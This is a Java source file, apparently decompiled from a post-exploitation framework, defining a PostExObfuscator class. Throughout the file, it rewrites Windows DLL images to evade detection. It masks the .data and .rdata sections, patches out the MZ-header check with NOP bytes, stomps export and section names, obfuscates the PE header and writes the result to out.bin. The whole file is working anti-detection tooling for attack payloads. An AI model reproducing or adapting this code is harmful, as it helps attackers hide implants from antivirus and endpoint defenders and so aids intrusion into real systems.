package pe;

import common.CommonUtils;

import java.io.File;

public class PostExObfuscator {
    protected PEEditor editor = null;

    public static byte[] setupSmartInject(byte[] arrby) {
        arrby[1023] = -12;
        arrby[1022] = -12;
        arrby[1021] = -12;
        arrby[1020] = -12;
        return arrby;
    }

    public void enableEvasions() {
        maskSection(".data");
        maskSection(".rdata");
        this.editor.setCharacteristic(2048, true);
        fixMZCheck();
    }

    public void fixMZCheck() {
        try {
            if (this.editor.getInfo().is64()) {
                byte[] arrby1 = CommonUtils.Bytes("b9 4d 5a 00 00 66 39 08 74 03 33 c0");
                byte[] arrby2 = CommonUtils.Bytes("b9 4d 5a 00 00 90 90 90 90 90");
                if (this.editor.patchCode(arrby1, arrby2)) {
                    return;
                }
                CommonUtils.print_error("Could not find x64 failure sequence in " + this.editor.getInfo().getDLLName() + " (job will crash)");
            } else {
                byte[] arrby1 = CommonUtils.Bytes("b8 4d 5a 00 00 66 39 01 74 04 33 c0");
                byte[] arrby2 = CommonUtils.Bytes("b8 4d 5a 00 00 90 90 90 90 90");
                if (this.editor.patchCode(arrby1, arrby2)) {
                    return;
                }
                arrby1 = CommonUtils.Bytes("b9 4d 5a 00 00 66 39 08 74 04 33 c0");
                arrby2 = CommonUtils.Bytes("b9 4d 5a 00 00 90 90 90 90 90");
                if (this.editor.patchCode(arrby1, arrby2)) {
                    return;
                }
                CommonUtils.print_error("Could not find x86 failure sequence in " + this.editor.getInfo().getDLLName() + " (job will crash)");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void deleteExportName() {
        int i = this.editor.getInfo().getLocation("Export.Name");
        int j = this.editor.getInt(i);
        this.editor.stomp(j);
    }

    public void deleteExportedFunctionNames() {
        int i = this.editor.getInfo().get("Export.NumberOfNames");
        for (int b = 0; b < i; b++) {
            int j = this.editor.getInfo().getLocation("Export.AddressOfName." + b);
            this.editor.stomp(j);
        }
    }

    public void deleteSectionNames() {
        int i = this.editor.getInfo().get("Sections");
        for (int b = 0; b < i; b++) {
            int j = this.editor.getInfo().getLocation("Sections.AddressOfName." + b);
            this.editor.stomp(j);
        }
    }

    public void maskSection(String string) {
        if (!this.editor.getInfo().hasSection(string)) {
            CommonUtils.print_stat("Will not mask '" + string + "'");
            return;
        }
        int i = this.editor.getInfo().get(string + ".PointerToRawData");
        int j = this.editor.getInfo().get(string + ".SizeOfRawData");
        byte b = -50;
        this.editor.mask(i, j, b);
        this.editor.setShort(this.editor.getInfo().getLocation(string + ".NumberOfRelocations"), b);
    }

    public byte[] getImage() {
        return this.editor.getImage();
    }

    public void process(byte[] arrby) {
        this.editor = new PEEditor(arrby);
        this.editor.checkAssertions();
        this.editor.obfuscatePEHeader();
        deleteExportName();
        deleteExportedFunctionNames();
        deleteSectionNames();
    }

    public static void main(String[] arrstring) {
        byte[] arrby = CommonUtils.readFile(arrstring[0]);
        PostExObfuscator postExObfuscator = new PostExObfuscator();
        postExObfuscator.process(arrby);
        arrby = postExObfuscator.getImage();
        CommonUtils.writeToFile(new File("out.bin"), arrby);
        PEParser pEParser = PEParser.load(arrby);
        System.out.println(pEParser.toString());
        pEParser.stringWalk();
    }
}
